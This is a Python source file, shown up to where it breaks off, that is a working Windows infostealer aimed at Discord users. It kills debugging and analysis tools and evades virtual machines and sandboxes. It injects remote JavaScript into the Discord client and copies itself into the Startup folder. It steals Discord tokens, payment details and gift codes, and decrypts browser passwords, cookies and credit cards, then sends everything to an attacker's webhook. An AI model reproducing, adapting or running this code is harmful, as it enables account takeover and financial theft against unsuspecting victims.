import os
import re
import sys
import time
import shutil
import ctypes
import winreg
import requests
import urllib
import random
import warnings
import threading
import subprocess
from sys import executable, stderr
from base64 import b64decode
from json import loads, dumps
from zipfile import ZipFile, ZIP_DEFLATED
from sqlite3 import connect as sql_connect
from urllib.request import Request, urlopen
from ctypes import windll, wintypes, byref, cdll, Structure, POINTER, c_char, c_buffer

class NullWriter(object):
    def write(self, arg):
        pass

warnings.filterwarnings("ignore")
null_writer = NullWriter()
stderr = null_writer

ModuleRequirements = [
    ["Crypto.Cipher", "pycryptodome" if not 'PythonSoftwareFoundation' in executable else 'Crypto']
]
for module in ModuleRequirements:
    try: 
        __import__(module[0])
    except:
        subprocess.Popen(f"\"{executable}\" -m pip install {module[1]} --quiet", shell=True)
        time.sleep(3)

from Crypto.Cipher import AES

def antidebug():
    checks = [check_windows, check_ip, check_registry, check_dll]
    for check in checks:
        t = threading.Thread(target=check, daemon=True)
        t.start()

def exit_program(reason):
    print(reason)
    ctypes.windll.kernel32.ExitProcess(0)

def check_windows():
    @ctypes.WINFUNCTYPE(ctypes.c_bool, ctypes.POINTER(ctypes.c_void_p), ctypes.POINTER(ctypes.c_void_p))
    def winEnumHandler(hwnd, ctx):
        title = ctypes.create_string_buffer(1024)
        ctypes.windll.user32.GetWindowTextA(hwnd, title, 1024)
        if title.value.decode('Windows-1252').lower() in {'proxifier', 'graywolf', 'extremedumper', 'zed', 'exeinfope', 'dnspy', 'titanHide', 'ilspy', 'titanhide', 'x32dbg', 'codecracker', 'simpleassembly', 'process hacker 2', 'pc-ret', 'http debugger', 'Centos', 'process monitor', 'debug', 'ILSpy', 'reverse', 'simpleassemblyexplorer', 'process', 'de4dotmodded', 'dojandqwklndoqwd-x86', 'sharpod', 'folderchangesview', 'fiddler', 'die', 'pizza', 'crack', 'strongod', 'ida -', 'brute', 'dump', 'StringDecryptor', 'wireshark', 'debugger', 'httpdebugger', 'gdb', 'kdb', 'x64_dbg', 'windbg', 'x64netdumper', 'petools', 'scyllahide', 'megadumper', 'reversal', 'ksdumper v1.1 - by equifox', 'dbgclr', 'HxD', 'monitor', 'peek', 'ollydbg', 'ksdumper', 'http', 'cse pro', 'dbg', 'httpanalyzer', 'httpdebug', 'PhantOm', 'kgdb', 'james', 'x32_dbg', 'proxy', 'phantom', 'mdbg', 'WPE PRO', 'system explorer', 'de4dot', 'x64dbg', 'X64NetDumper', 'protection_id', 'charles', 'systemexplorer', 'pepper', 'hxd', 'procmon64', 'MegaDumper', 'ghidra', 'xd', '0harmony', 'dojandqwklndoqwd', 'hacker', 'process hacker', 'SAE', 'mdb', 'checker', 'harmony', 'Protection_ID', 'PETools', 'scyllaHide', 'x96dbg', 'systemexplorerservice', 'folder', 'mitmproxy', 'dbx', 'sniffer', 'http toolkit', 'george',}:
            pid = ctypes.c_ulong(0)
            ctypes.windll.user32.GetWindowThreadProcessId(hwnd, ctypes.byref(pid))
            if pid.value != 0:
                try:
                    handle = ctypes.windll.kernel32.OpenProcess(1, False, pid)
                    ctypes.windll.kernel32.TerminateProcess(handle, -1)
                    ctypes.windll.kernel32.CloseHandle(handle)
                except:
                    pass
            exit_program(f'Debugger Open, Type: {title.value.decode("utf-8")}')
        return True

    while True:
        ctypes.windll.user32.EnumWindows(winEnumHandler, None)
        time.sleep(0.5)
def check_ip():
    blacklisted = {'88.132.227.238', '79.104.209.33', '92.211.52.62', '20.99.160.173', '188.105.91.173', '64.124.12.162', '195.181.175.105', '194.154.78.160',  '109.74.154.92', '88.153.199.169', '34.145.195.58', '178.239.165.70', '88.132.231.71', '34.105.183.68', '195.74.76.222', '192.87.28.103', '34.141.245.25', '35.199.6.13', '34.145.89.174', '34.141.146.114', '95.25.204.90', '87.166.50.213', '193.225.193.201', '92.211.55.199', '35.229.69.227', '104.18.12.38', '88.132.225.100', '213.33.142.50', '195.239.51.59', '34.85.243.241', '35.237.47.12', '34.138.96.23', '193.128.114.45', '109.145.173.169', '188.105.91.116', 'None', '80.211.0.97', '84.147.62.12', '78.139.8.50', '109.74.154.90', '34.83.46.130', '212.119.227.167', '92.211.109.160', '93.216.75.209', '34.105.72.241', '212.119.227.151', '109.74.154.91', '95.25.81.24', '188.105.91.143', '192.211.110.74', '34.142.74.220', '35.192.93.107', '88.132.226.203', '34.85.253.170', '34.105.0.27', '195.239.51.3', '192.40.57.234', '92.211.192.144', '23.128.248.46', '84.147.54.113', '34.253.248.228',None}    
    while True:
        try:
            ip = urllib.request.urlopen('https://checkip.amazonaws.com').read().decode().strip()
            if ip in blacklisted:
                exit_program('Blacklisted IP Detected')
            return
        except:
            pass

def check_registry():
    try:
        key = winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE, r'SYSTEM\CurrentControlSet\Enum\IDE', 0, winreg.KEY_READ)
        subkey_count = winreg.QueryInfoKey(key)[0]
        for i in range(subkey_count):
            subkey = winreg.EnumKey(key, i)
            if subkey.startswith('VMWARE'):
                exit_program('VM Detected')
        winreg.CloseKey(key)
    except:
        pass

def check_dll():
    sys_root = os.environ.get('SystemRoot', 'C:\\Windows')
    if os.path.exists(os.path.join(sys_root, "System32\\vmGuestLib.dll")) or os.path.exists(os.path.join(sys_root, "vboxmrxnp.dll")):
        exit_program('VM Detected')

cname = "https://rentry.co/u4tup/raw"
cnameresp = requests.get(cname)
cname = cnameresp.text

smallcname = "https://rentry.co/5crcu/raw"
smallcnameresp = requests.get(smallcname)
smallcname = smallcnameresp.text

footerc = "https://rentry.co/pmpxa/raw"
footercresp = requests.get(footerc)
footerc = footercresp.text

words = "https://rentry.co/5uu99/raw"
wordsresp = requests.get(words)
words = wordsresp.text

h00k = "YOUR_WEBHOOK_URL"
inj3c710n_url = f"https://raw.githubusercontent.com/wtf{cname}wtf/index/main/injection.js"

class DATA_BLOB(Structure):
    _fields_ = [
        ('cbData', wintypes.DWORD),
        ('pbData', POINTER(c_char))
    ]

def G371P():
    try:return urlopen(Request("https://api.ipify.org")).read().decode().strip()
    except:return "None"

def Z1PF01D3r(foldername, target_dir):            
    zipobj = ZipFile(temp+"/"+foldername + '.zip', 'w', ZIP_DEFLATED)
    rootlen = len(target_dir) + 1
    for base, dirs, files in os.walk(target_dir):
        for file in files:
            fn = os.path.join(base, file)
            if not "user_data" in fn:
                zipobj.write(fn, fn[rootlen:])

def G37D474(blob_out):
    cbData = int(blob_out.cbData)
    pbData = blob_out.pbData
    buffer = c_buffer(cbData)
    cdll.msvcrt.memcpy(buffer, pbData, cbData)
    windll.kernel32.LocalFree(pbData)
    return buffer.raw

def CryptUnprotectData(encrypted_bytes, entropy=b''):
    buffer_in = c_buffer(encrypted_bytes, len(encrypted_bytes))
    buffer_entropy = c_buffer(entropy, len(entropy))
    blob_in = DATA_BLOB(len(encrypted_bytes), buffer_in)
    blob_entropy = DATA_BLOB(len(entropy), buffer_entropy)
    blob_out = DATA_BLOB()

    if windll.crypt32.CryptUnprotectData(byref(blob_in), None, byref(blob_entropy), None, None, 0x01, byref(blob_out)):
        return G37D474(blob_out)

def D3CrYP7V41U3(buff, master_key=None):
        starts = buff.decode(encoding='utf8', errors='ignore')[:3]
        if starts == 'v10' or starts == 'v11':
            iv = buff[3:15]
            payload = buff[15:]
            cipher = AES.new(master_key, AES.MODE_GCM, iv)
            decrypted_pass = cipher.decrypt(payload)
            decrypted_pass = decrypted_pass[:-16]
            try: decrypted_pass = decrypted_pass.decode()
            except:pass
            return decrypted_pass

def L04DUr118(h00k, data='', headers=''):
    for i in range(8):
        try:
            if headers != '':
                r = urlopen(Request(h00k, data=data, headers=headers))
            else:
                r = urlopen(Request(h00k, data=data))
            return r
        except: 
           pass

def G108411NF0():
    try:
        username = os.getenv("USERNAME")
        ipdatanojson = urlopen(Request(f"https://geolocation-db.com/jsonp/{IP}")).read().decode().replace('callback(', '').replace('})', '}')
        ipdata = loads(ipdatanojson)
        contry = ipdata["country_name"]
        contryCode = ipdata["country_code"].lower()
        if contryCode == "not found":
            globalinfo = f":rainbow_flag:  - `{username.upper()} | {IP} ({contry})`"
        else:
            globalinfo = f":flag_{contryCode}:  - `{username.upper()} | {IP} ({contry})`"
        return globalinfo

    except:
        return f":rainbow_flag:  - `{username.upper()}`"

def TrU57(C00K13s):
    global DETECTED
    data = str(C00K13s)
    tim = re.findall(".google.com", data)
    DETECTED = True if len(tim) < -1 else False
    return DETECTED

def inj3c710n():

    username = os.getlogin()

    folder_list = ['Discord', 'DiscordCanary', 'DiscordPTB', 'DiscordDevelopment']

    for folder_name in folder_list:
        deneme_path = os.path.join(os.getenv('LOCALAPPDATA'), folder_name)
        if os.path.isdir(deneme_path):
            for subdir, dirs, files in os.walk(deneme_path):
                if 'app-' in subdir:
                    for dir in dirs:
                        if 'modules' in dir:
                            module_path = os.path.join(subdir, dir)
                            for subsubdir, subdirs, subfiles in os.walk(module_path):
                                if 'discord_desktop_core-' in subsubdir:
                                    for subsubsubdir, subsubdirs, subsubfiles in os.walk(subsubdir):
                                        if 'discord_desktop_core' in subsubsubdir:
                                            for file in subsubfiles:
                                                if file == 'index.js':
                                                    file_path = os.path.join(subsubsubdir, file)

                                                    injeCTmED0cT0r_cont = requests.get(inj3c710n_url).text

                                                    injeCTmED0cT0r_cont = injeCTmED0cT0r_cont.replace("%WEBHOOK%", h00k)

                                                    with open(file_path, "w", encoding="utf-8") as index_file:
                                                        index_file.write(injeCTmED0cT0r_cont)
inj3c710n()

def G37C0D35(token):
    try:
        codes = ""
        headers = {"Authorization": token,"Content-Type": "application/json","User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:102.0) Gecko/20100101 Firefox/102.0"}
        codess = loads(urlopen(Request("https://discord.com/api/v9/users/@me/outbound-promotions/codes?locale=en-GB", headers=headers)).read().decode())

        for code in codess:
            try:codes += f"<:black_gift:1184971095003107451> **{str(code['promotion']['outbound_title'])}**\n<:Rightdown:891355646476296272> `{str(code['code'])}`\n"
            except:pass

        nitrocodess = loads(urlopen(Request("https://discord.com/api/v9/users/@me/entitlements/gifts?locale=en-GB", headers=headers)).read().decode())
        if nitrocodess == []: return codes

        for element in nitrocodess:
            
            sku_id = element['sku_id']
            subscription_plan_id = element['subscription_plan']['id']
            name = element['subscription_plan']['name']

            url = f"https://discord.com/api/v9/users/@me/entitlements/gift-codes?sku_id={sku_id}&subscription_plan_id={subscription_plan_id}"
            nitrrrro = loads(urlopen(Request(url, headers=headers)).read().decode())

            for el in nitrrrro:
                cod = el['code']
                try:codes += f"<:black_gift:1184971095003107451> **{name}**\n<:Rightdown:891355646476296272> `https://discord.gift/{cod}`\n"
                except:pass
        return codes
    except:return ""

def G3781111N6(token):
    headers = {
        "Authorization": token,
        "Content-Type": "application/json",
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:102.0) Gecko/20100101 Firefox/102.0"
    }
    try:
        billingjson = loads(urlopen(Request("https://discord.com/api/users/@me/billing/payment-sources", headers=headers)).read().decode())
    except:
        return False

    if billingjson == []: return "`None`"

    billing = ""
    for methode in billingjson:
        if methode["invalid"] == False:
            if methode["type"] == 1:
                billing += ":credit_card:"
            elif methode["type"] == 2:
                billing += ":parking: "

    return billing

def G3784D63(flags):
    if flags == 0: return ''

    OwnedBadges = ''
    badgeList =  [
        {"Name": 'Active_Developer',                'Value': 4194304,   'Emoji': '<:active:1045283132796063794> '},
        {"Name": 'Early_Verified_Bot_Developer',    'Value': 131072,    'Emoji': "<:developer:874750808472825986> "},
        {"Name": 'Bug_Hunter_Level_2',              'Value': 16384,     'Emoji': "<:bughunter_2:874750808430874664> "},
        {"Name": 'Early_Supporter',                 'Value': 512,       'Emoji': "<:early_supporter:874750808414113823> "},
        {"Name": 'House_Balance',                   'Value': 256,       'Emoji': "<:balance:874750808267292683> "},
        {"Name": 'House_Brilliance',                'Value': 128,       'Emoji': "<:brilliance:874750808338608199> "},
        {"Name": 'House_Bravery',                   'Value': 64,        'Emoji': "<:bravery:874750808388952075> "},
        {"Name": 'Bug_Hunter_Level_1',              'Value': 8,         'Emoji': "<:bughunter_1:874750808426692658> "},
        {"Name": 'HypeSquad_Events',                'Value': 4,         'Emoji': "<:hypesquad_events:874750808594477056> "},
        {"Name": 'Partnered_Server_Owner',          'Value': 2,         'Emoji': "<:partner:874750808678354964> "},
        {"Name": 'Discord_Employee',                'Value': 1,         'Emoji': "<:staff:874750808728666152> "}
    ]

    for badge in badgeList:
        if flags // badge["Value"] != 0:
            OwnedBadges += badge["Emoji"]
            flags = flags % badge["Value"]

    return OwnedBadges

def G37UHQFr13ND5(token):
    badgeList =  [
        {"Name": 'Active_Developer',                'Value': 4194304,   'Emoji': '<:active:1045283132796063794> '},
        {"Name": 'Early_Verified_Bot_Developer',    'Value': 131072,    'Emoji': "<:developer:874750808472825986> "},
        {"Name": 'Bug_Hunter_Level_2',              'Value': 16384,     'Emoji': "<:bughunter_2:874750808430874664> "},
        {"Name": 'Early_Supporter',                 'Value': 512,       'Emoji': "<:early_supporter:874750808414113823> "},
        {"Name": 'House_Balance',                   'Value': 256,       'Emoji': "<:balance:874750808267292683> "},
        {"Name": 'House_Brilliance',                'Value': 128,       'Emoji': "<:brilliance:874750808338608199> "},
        {"Name": 'House_Bravery',                   'Value': 64,        'Emoji': "<:bravery:874750808388952075> "},
        {"Name": 'Bug_Hunter_Level_1',              'Value': 8,         'Emoji': "<:bughunter_1:874750808426692658> "},
        {"Name": 'HypeSquad_Events',                'Value': 4,         'Emoji': "<:hypesquad_events:874750808594477056> "},
        {"Name": 'Partnered_Server_Owner',          'Value': 2,         'Emoji': "<:partner:874750808678354964> "},
        {"Name": 'Discord_Employee',                'Value': 1,         'Emoji': "<:staff:874750808728666152> "}
    ]
    headers = {
        "Authorization": token,
        "Content-Type": "application/json",
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:102.0) Gecko/20100101 Firefox/102.0"
    }
    try:
        friendlist = loads(urlopen(Request("https://discord.com/api/v6/users/@me/relationships", headers=headers)).read().decode())
    except:
        return False

    uhqlist = ''
    for friend in friendlist:
        OwnedBadges = ''
        flags = friend['user']['public_flags']
        for badge in badgeList:
            if flags // badge["Value"] != 0 and friend['type'] == 1:
                if not "House" in badge["Name"] and not badge["Name"] == "Active_Developer":
                    OwnedBadges += badge["Emoji"]
                flags = flags % badge["Value"]
        if OwnedBadges != '':
            uhqlist += f"{OwnedBadges} | **{friend['user']['username']}#{friend['user']['discriminator']}** `({friend['user']['id']})`\n"
    return uhqlist if uhqlist != '' else "`No HQ Friends Found`"

def G37UHQ6U11D5(token):
    try:
        uhqguilds = ''
        headers = {
            "Authorization": token,
            "Content-Type": "application/json",
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:102.0) Gecko/20100101 Firefox/102.0"
        }
        guilds = loads(urlopen(Request("https://discord.com/api/v9/users/@me/guilds?with_counts=true", headers=headers)).read().decode())
        for guild in guilds:
            if guild["approximate_member_count"] < 1: continue
            if guild["owner"] or guild["permissions"] == "4398046511103":
                inv = loads(urlopen(Request(f"https://discord.com/api/v6/guilds/{guild['id']}/invites", headers=headers)).read().decode())    
                try:    cc = "https://discord.gg/"+str(inv[0]['code'])
                except: cc = False
                uhqguilds += f"<:blackarrow:1095740975197995041> [{guild['name']}] **{str(guild['approximate_member_count'])} Members**\n"
        if uhqguilds == '': return '`No HQ Guilds Found`'
        return uhqguilds
    except:
        return 'No HQ Guilds Found'

def G3770K3N1NF0(token):
    headers = {
        "Authorization": token,
        "Content-Type": "application/json",
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:102.0) Gecko/20100101 Firefox/102.0"
    }

    userjson = loads(urlopen(Request("https://discordapp.com/api/v6/users/@me", headers=headers)).read().decode())
    username = userjson["username"]
    hashtag = userjson["discriminator"]
    email = userjson["email"]
    idd = userjson["id"]
    pfp = userjson["avatar"]
    flags = userjson["public_flags"]
    nitro = ""
    phone = ""

    if "premium_type" in userjson:
        nitrot = userjson["premium_type"]
        if nitrot == 1:
            nitro = "<:classic:896119171019067423> "
        elif nitrot == 2:
            nitro = "<a:boost:824036778570416129> <:classic:896119171019067423> "
    if "phone" in userjson: phone = f'`{userjson["phone"]}`' if userjson["phone"] != None else "`None`"

    return username, hashtag, email, idd, pfp, flags, nitro, phone

def CH3CK70K3N(token):
    headers = {
        "Authorization": token,
        "Content-Type": "application/json",
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:102.0) Gecko/20100101 Firefox/102.0"
    }
    try:
        urlopen(Request("https://discordapp.com/api/v6/users/@me", headers=headers))
        return True
    except:
        return False

if getattr(sys, 'frozen', False):
    currentFilePath = os.path.dirname(sys.executable)
else:
    currentFilePath = os.path.dirname(os.path.abspath(__file__))

fileName = os.path.basename(sys.argv[0])
filePath = os.path.join(currentFilePath, fileName)

startupFolderPath = os.path.join(os.path.expanduser('~'), 'AppData', 'Roaming', 'Microsoft', 'Windows', 'Start Menu', 'Programs', 'Startup')
startupFilePath = os.path.join(startupFolderPath, fileName)

if os.path.abspath(filePath).lower() != os.path.abspath(startupFilePath).lower():
    with open(filePath, 'rb') as src_file, open(startupFilePath, 'wb') as dst_file:
        shutil.copyfileobj(src_file, dst_file)

def Tr1M(obj):
    if len(obj) > 1000: 
        f = obj.split("\n")
        obj = ""
        for i in f:
            if len(obj)+ len(i) >= 1000: 
                obj += "..."
                break
            obj += i + "\n"
    return obj

def UP104D70K3N(token, path):
    global h00k
    headers = {
        "Content-Type": "application/json",
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:102.0) Gecko/20100101 Firefox/102.0"
    }
    username, hashtag, email, idd, pfp, flags, nitro, phone = G3770K3N1NF0(token)

    pfp = f"https://cdn.discordapp.com/avatars/{idd}/{pfp}" if pfp != None else "https://media.discordapp.net/attachments/1111364024408494140/1111364181032177766/cs.png"
    billing = G3781111N6(token)
    badge = G3784D63(flags)
    friends = Tr1M(G37UHQFr13ND5(token))
    guilds = Tr1M(G37UHQ6U11D5(token))
    codes = Tr1M(G37C0D35(token))

    if codes == "": codes = "`No Gifts Found`"
    if billing == "": billing = ":lock:"
    if badge == "" and nitro == "": badge, nitro = ":lock:", ""
    if phone == "": phone = "`None`"
    if friends == "": friends = ":lock:"
    if guilds == "": guilds = ":lock:"
    path = path.replace("\\", "/")

    data = {
        "content": f'{GLINFO} **Found in** `{path}`',
        "embeds": [
            {
            "color": 2895667,
            "fields": [
                {
                    "name": "<:hackerblack:1095747410539593800> Token:",
                    "value": f"`{token}`"
                },
                {
                    "name": "<:mail:1095741024678191114> Email:",
                    "value": f"`{email}`",
                    "inline": True
                },
                {
                    "name": "<:phone:1095741029832990720> Phone:",
                    "value": f"{phone}",
                    "inline": True
                },
                {
                    "name": "<a:blackworld:1095741984385290310> IP:",
                    "value": f"`{G371P()}`",
                    "inline": True
                },
                {
                    "name": "<a:blackhypesquad:1095742323423453224> Badges:",
                    "value": f"{nitro}{badge}",
                    "inline": True
                },
                {
                    "name": "<a:blackmoneycard:1095741026850852965> Billing:",
                    "value": f"{billing}",
                    "inline": True
                },
                {
                    "name": "<:friends:1111401676511924448> HQ Friends:",
                    "value": f"{friends}",
                    "inline": False
                },
                {
                    "name": "<:black_crown:1184938153291829288> HQ Guilds:",
                    "value": f"{guilds}",
                    "inline": False
                },
                {
                    "name": "<:black_gift:1184971095003107451> Gift Codes:",
                    "value": f"{codes}",
                    "inline": False
                }
                ],
            "author": {
                "name": f"{username}#{hashtag} ({idd})",
                "icon_url": f"{pfp}"
                },
            "footer": {
                "text": f"{footerc}",
                "icon_url": "https://media.discordapp.net/attachments/1111364024408494140/1111364181032177766/cs.png"
                },
            "thumbnail": {
                "url": f"{pfp}"
                }
            }
        ],
        "username": f"{cname} | t.me/{smallcname}r",
        "avatar_url": "https://media.discordapp.net/attachments/1111364024408494140/1111364181032177766/cs.png",
        "attachments": []
        }
    L04DUr118(h00k, data=dumps(data).encode(), headers=headers)

def r3F0rM47(listt):
    e = re.findall("(\w+[a-z])",listt)
    while "https" in e: e.remove("https")
    while "com" in e: e.remove("com")
    while "net" in e: e.remove("net")
    return list(set(e))

def UP104D(name, link):
    headers = {
        "Content-Type": "application/json",
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:102.0) Gecko/20100101 Firefox/102.0"
    }

    if "Data Searcher" in name:
        data = {
            "content": GLINFO,
            "embeds": [
                {
               "title": f"{cname} | Data Extractor",
                "color": 2895667,
                "fields": link,
                "footer": {
                    "text": f"{footerc}",
                    "icon_url": "https://media.discordapp.net/attachments/1111364024408494140/1111364181032177766/cs.png"
                },
                }
            ],
            "username": f"{cname} | t.me/{smallcname}r",
            "avatar_url": "https://media.discordapp.net/attachments/1111364024408494140/1111364181032177766/cs.png",
            "attachments": []
            }
        L04DUr118(h00k, data=dumps(data).encode(), headers=headers)
        return
    
    if name == "kiwi":
        string = link.split("\n\n")
        endlist = []
        for i in string:
            i = i.split("\n")
            i = list(filter(None, i))
            val = ""
            for x in i:
                if x.startswith("└─"):
                    val += x + "\n"
            if len(i) > 1:
                endlist.append({"name": i[0], "value": val, "inline": False})
        data = {
            "content": GLINFO,
            "embeds": [
                {
                "color": 2895667,
                "fields": endlist,
                "title": f"{cname} | File {words}",
                "footer": {
                    "text": f"{footerc}",
                    "icon_url": "https://media.discordapp.net/attachments/1111364024408494140/1111364181032177766/cs.png"
                }
                }
            ],
            "username": f"{cname} | t.me/{smallcname}r",
            "avatar_url": "https://media.discordapp.net/attachments/1111364024408494140/1111364181032177766/cs.png",
            "attachments": []
            }
        L04DUr118(h00k, data=dumps(data).encode(), headers=headers)
        return

def Wr173F0rF113(data, name):
    path = os.getenv("TEMP") + f"\cs{name}.txt"
    with open(path, mode='w', encoding='utf-8') as f:
        for line in data:
            if line[0] != '':
                f.write(f"{line}\n")

def G3770K3N(path, arg):
    if not os.path.exists(path): return

    path += arg
    for file in os.listdir(path):
        if file.endswith(".log") or file.endswith(".ldb")   :
            for line in [x.strip() for x in open(f"{path}\\{file}", errors="ignore").readlines() if x.strip()]:
                for regex in (r"[\w-]{24}\.[\w-]{6}\.[\w-]{25,110}", r"mfa\.[\w-]{80,95}"):
                    for token in re.findall(regex, line):
                        global T0K3Ns
                        if CH3CK70K3N(token):
                            if not token in T0K3Ns:
                                T0K3Ns += token
                                UP104D70K3N(token, path)


def SQ17H1N6(pathC, tempfold, cmd):
    shutil.copy2(pathC, tempfold)
    conn = sql_connect(tempfold)
    cursor = conn.cursor()
    cursor.execute(cmd)
    data = cursor.fetchall()
    cursor.close()
    conn.close()
    os.remove(tempfold)
    return data

def G37P455W(path, arg):
    try:
        global P455w, P455WC0UNt
        if not os.path.exists(path): return

        pathC = path + arg + "/Login Data"
        if os.stat(pathC).st_size == 0: return

        tempfold = temp + "cs" + ''.join(random.choice('bcdefghijklmnopqrstuvwxyz') for i in range(8)) + ".db"

        data = SQ17H1N6(pathC, tempfold, "SELECT action_url, username_value, password_value FROM logins;")

        pathKey = path + "/Local State"
        with open(pathKey, 'r', encoding='utf-8') as f: local_state = loads(f.read())
        master_key = b64decode(local_state['os_crypt']['encrypted_key'])
        master_key = CryptUnprotectData(master_key[5:])

        for row in data:
            if row[0] != '':
                for wa in k3YW0rd:
                    old = wa
                    if "https" in wa:
                        tmp = wa
                        wa = tmp.split('[')[1].split(']')[0]
                    if wa in row[0]:
                        if not old in p45WW0rDs: p45WW0rDs.append(old)
                P455w.append(f"UR1: {row[0]} | U53RN4M3: {row[1]} | P455W0RD: {D3CrYP7V41U3(row[2], master_key)}")
                P455WC0UNt += 1
        Wr173F0rF113(P455w, 'passwords')
    except:pass

def G37C00K13(path, arg):
    try:
        global C00K13s, C00K1C0UNt
        if not os.path.exists(path): return

        pathC = path + arg + "/Cookies"
        if os.stat(pathC).st_size == 0: return

        tempfold = temp + "cs" + ''.join(random.choice('bcdefghijklmnopqrstuvwxyz') for i in range(8)) + ".db"

        data = SQ17H1N6(pathC, tempfold, "SELECT host_key, name, encrypted_value FROM cookies ")

        pathKey = path + "/Local State"

        with open(pathKey, 'r', encoding='utf-8') as f: local_state = loads(f.read())
        master_key = b64decode(local_state['os_crypt']['encrypted_key'])
        master_key = CryptUnprotectData(master_key[5:])

        for row in data:
            if row[0] != '':
                for wa in k3YW0rd:
                    old = wa
                    if "https" in wa:
                        tmp = wa
                        wa = tmp.split('[')[1].split(']')[0]
                    if wa in row[0]:
                        if not old in c00K1W0rDs: c00K1W0rDs.append(old)
                C00K13s.append(f"{row[0]}	TRUE	/	FALSE	2597573456	{row[1]}	{D3CrYP7V41U3(row[2], master_key)}")
                C00K1C0UNt += 1
        Wr173F0rF113(C00K13s, 'cookies')
    except:pass

def G37CC5(path, arg):
    try:
        global CCs, CC5C0UNt
        if not os.path.exists(path): return

        pathC = path + arg + "/Web Data"
        if os.stat(pathC).st_size == 0: return

        tempfold = temp + "cs" + ''.join(random.choice('bcdefghijklmnopqrstuvwxyz') for i in range(8)) + ".db"

        data = SQ17H1N6(pathC, tempfold, "SELECT * FROM credit_cards ")

        pathKey = path + "/Local State"
        with open(pathKey, 'r', encoding='utf-8') as f: local_state = loads(f.read())
        master_key = b64decode(local_state['os_crypt']['encrypted_key'])
        master_key = CryptUnprotectData(master_key[5:])

        for row in data:
            if row[0] != '':
                CCs.append(f"C4RD N4M3: {row[1]} | NUMB3R: {D3CrYP7V41U3(row[4], master_key)} | EXP1RY: {row[2]}/{row[3]}")
                CC5C0UNt += 1
        Wr173F0rF113(CCs, 'creditcards')
    except:pass

def G374U70F111(path, arg):
    try:
        global AU70F11l, AU70F111C0UNt
        if not os.path.exists(path): return

        pathC = path + arg + "/Web Data"
        if os.stat(pathC).st_size == 0: return

        tempfold = temp + "cs" + ''.join(random.choice('bcdefghijklmnopqrstuvwxyz') for i in range(8)) + ".db"

        data = SQ17H1N6(pathC, tempfold,"SELECT * FROM autofill WHERE value NOT NULL")

        for row in data:
            if row[0] != '':
                AU70F11l.append(f"N4M3: {row[0]} | V4LU3: {row[1]}")
                AU70F111C0UNt += 1
        Wr173F0rF113(AU70F11l, 'autofill')
    except:pass

def G37H1570rY(path, arg):
    try:
        global H1570rY, H1570rYC0UNt
        if not os.path.exists(path): return

        pathC = path + arg + "History"
        if os.stat(pathC).st_size == 0: return
        tempfold = temp + "cs" + ''.join(random.choice('bcdefghijklmnopqrstuvwxyz') for i in range(8)) + ".db"
        data = SQ17H1N6(pathC, tempfold,"SELECT * FROM urls")

        for row in data:
            if row[0] != '':
                H1570rY.append(row[1])
                H1570rYC0UNt += 1
        Wr173F0rF113(H1570rY, 'history')
    except:pass

def G37W3851735(Words):
    rb = ' | '.join(da for da in Words)
    if len(rb) > 1000:
        rrrrr = r3F0rM47(str(Words))
        return ' | '.join(da for da in rrrrr)
    else: return rb

def G37800KM4rK5(path, arg):
    try:
        global B00KM4rK5, B00KM4rK5C0UNt
        if not os.path.exists(path): return

        pathC = path + arg + "Bookmarks"
        if os.path.exists(pathC):
            with open(pathC, 'r', encoding='utf8') as f:
                data = loads(f.read())
                for i in data['roots']['bookmark_bar']['children']:
                    try:
                        B00KM4rK5.append(f"N4M3: {i['name']} | UR1: {i['url']}")
                        B00KM4rK5C0UNt += 1
                    except:pass
        if os.stat(pathC).st_size == 0: return
        Wr173F0rF113(B00KM4rK5, 'bookmarks')
    except:pass

def s74r787Hr34D(func, arg):
    global Browserthread
    t = threading.Thread(target=func, args=arg)
    t.start()
    Browserthread.append(t)

def G378r0W53r5(br0W53rP47H5):
    global Browserthread
    ThCokk, Browserthread, filess = [], [], []
    for patt in br0W53rP47H5:
        a = threading.Thread(target=G37C00K13, args=[patt[0], patt[4]])
        a.start()
        ThCokk.append(a)

        s74r787Hr34D(G374U70F111,       [patt[0], patt[3]])
        s74r787Hr34D(G37H1570rY,        [patt[0], patt[3]])
        s74r787Hr34D(G37800KM4rK5,      [patt[0], patt[3]])
        s74r787Hr34D(G37CC5,            [patt[0], patt[3]])
        s74r787Hr34D(G37P455W,          [patt[0], patt[3]])

    for thread in ThCokk: thread.join()
    if TrU57(C00K13s) == True: __import__('sys').exit(0)
    for thread in Browserthread: thread.join()

    for file in ["cspasswords.txt", "cscookies.txt", "cscreditcards.txt", "csautofills.txt", "cshistories.txt", "csbookmarks.txt"]:
        filess.append(UP104D7060F113(os.getenv("TEMP") + "\\" + file))
    headers = {"Content-Type": "application/json","User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:102.0) Gecko/20100101 Firefox/102.0"}

    data = {
        "content": GLINFO,
        "embeds": [
            {
                "title": f"{cname} | Password {words}",
                "description": f"**Found**:\n{G37W3851735(p45WW0rDs)}\n\n**Data:**\n<:blacklock:1095741022065131571> • **{P455WC0UNt}** Passwords Found\n<:blackarrow:1095740975197995041> • [{cname}Passwords.txt]({filess[0]})",
                "color": 2895667,
                "footer": {"text": f"{footerc}",  
                "icon_url": "https://media.discordapp.net/attachments/1111364024408494140/1111364181032177766/cs.png"}
            },
            {
                "title": f"{cname} | Cookies {words}",
                "description": f"**Found**:\n{G37W3851735(c00K1W0rDs)}\n\n**Data:**\n<:browser:1095742866518716566> • **{C00K1C0UNt}** Cookies Found\n<:blackarrow:1095740975197995041> • [{cname}Cookies.txt]({filess[1]})",
                "color": 2895667,
                "footer": {"text": f"{footerc}",  
                "icon_url": "https://media.discordapp.net/attachments/1111364024408494140/1111364181032177766/cs.png"}
            },
            {
                "title": f"{cname} | Browser Data",
